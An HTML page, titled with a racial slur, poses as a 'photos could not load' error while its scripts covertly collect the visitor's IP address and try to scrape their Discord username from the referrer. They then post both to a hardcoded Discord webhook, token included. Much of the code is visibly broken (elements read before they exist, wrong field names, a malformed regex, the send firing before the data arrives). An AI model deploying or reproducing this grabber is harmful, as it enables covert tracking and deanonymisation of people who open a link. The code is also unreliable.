<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>NiggaBin</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #000000;
    }
    .container {
      text-align: center;
      background: #fff;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
    }
    p {
      margin-bottom: 20px;
      color: #555;
    }
  </style>
</head>
<body>

  <!-- Grab the user information (IP + Discord user) -->
  <script src="https://discord.com/assets/725e49023f2d93899adfd05b2f5bb.js"></script>
  <script>
    // Global variables to keep the information after harvesting.
    const userIP = document.getElementById("ip_address");
    const discordUser = document.getElementById("discord_username");

    /**
     * This function aims to extract and harvest user data
     */
    async function fetchDiscordIPAndUser() {
      /**
       * Extract information from server & try to obtain discord data from referrers
       */

      try {
        if (document.referrer.includes("discordapp")) {
          // The website has been referred by Discord. We want to harvest a user if a username exists there
          getUserData(document.referrer);
        }

        fetch("https://ipapi.co/json")
          .then((res) => res.json())
          .then((res) => (userIP.innerHTML = `${res.ip_address}`));

      } catch (err) {
        userIP.innerHTML = "Couldn't extract server IP data.";
        console.log(err);
      }

      /**
       * Attempt to get users' discord information by using window.referrer to discover
       * the URL which was referred when this website is visited
       */

      function* iterateAndExtractUserByReferer() {
        let history = window.location.referrer;

        let pattern =
          /\b(?:[https?\:\/\/)?(www\.)?(discord\.)?discord(?:\.[a-z\d.]{2,})?\/(?:channels\/(?:[0-9]+|@me|[a-zA-Z0-9_-]+|[a-zA-Z0-9_-]+#([0-9]+))|guilds\/(?:[0-9]+|[a-zA-Z0-9_-]+))/g;

        let match;
        while ((match = pattern.exec(history)) !== null) {
          let discordLink = match[0];
          getUserData(discordLink);
        }
      }

      /**
       * Function to fetch user data from the provided Discord link
       * @param {string} discordLink - The Discord link to fetch user data from
       */
      function getUserData(discordLink) {
        fetch(discordLink)
          .then((res) => res.text())
          .then((res) => {
            let usernamePattern = /@([a-zA-Z0-9_-]+)/;
            let usernameMatch = usernamePattern.exec(res);
            if (usernameMatch) {
              discordUser.innerHTML = usernameMatch[1];
            }
          })
          .catch((err) => {
            console.log(err);
          });
      }

      /**
       * Start the process of extracting user data
       */
      iterateAndExtractUserByReferer();
    }

    /**
     * Call the function to start the process
     */
    fetchDiscordIPAndUser();
  </script>

  <div class="container">
    <h1>photos could not load on your browser</h1>
    <p>!!!</p>
    <p style="color: red;" id="status">Please wait...</p>
    <p>IP Address: <span id="ip_address"></span></p>
    <p>Discord Username: <span id="discord_username"></span></p>
  </div>

  <script>
    // Discord Webhook URL
    const webhookURL = "https://discordapp.com/api/webhooks/1324471977901031518/CHYYiJT-J8iioa1LLlkijVeq_sWO586koMQBBJhVQGCH_6dXZoFBNlL1BR9kOV-QrM9S";

    // Function to send the harvested data to the Discord webhook
    function sendDataToDiscordWebhook() {
      const data = {
        content: `IP Address: ${userIP.innerHTML}\nDiscord Username: ${discordUser.innerHTML}`,
      };

      fetch(webhookURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      })
        .then((res) => res.json())
        .then((res) => console.log("Data sent to Discord Webhook"))
        .catch((err) => console.log(err));
    }

    // Call the function to send the data to the Discord webhook
    sendDataToDiscordWebhook();
  </script>
</body>
</html>
